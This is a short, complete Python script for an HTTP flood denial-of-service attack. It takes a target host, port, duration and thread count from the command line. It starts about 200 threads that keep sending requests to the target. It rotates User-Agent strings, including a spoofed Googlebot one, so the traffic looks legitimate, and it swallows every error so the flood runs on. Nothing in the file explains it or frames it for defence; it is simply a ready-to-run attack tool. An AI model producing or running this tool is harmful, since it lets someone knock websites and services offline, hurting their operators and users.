#!/usr/bin/env python3
import urllib.request, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 200

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

def flood():
    try:
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                req = urllib.request.Request(f"http://{target}:{port}/")
                req.add_header('User-Agent', random.choice(user_agents))
                urllib.request.urlopen(req, timeout=1)
                count += 1
                if count % 1000 == 0:
                    sys.stderr.write(f"HTTP: {count} requests\n")
            except:
                pass
        sys.stderr.write(f"HTTP completed: {count} requests\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
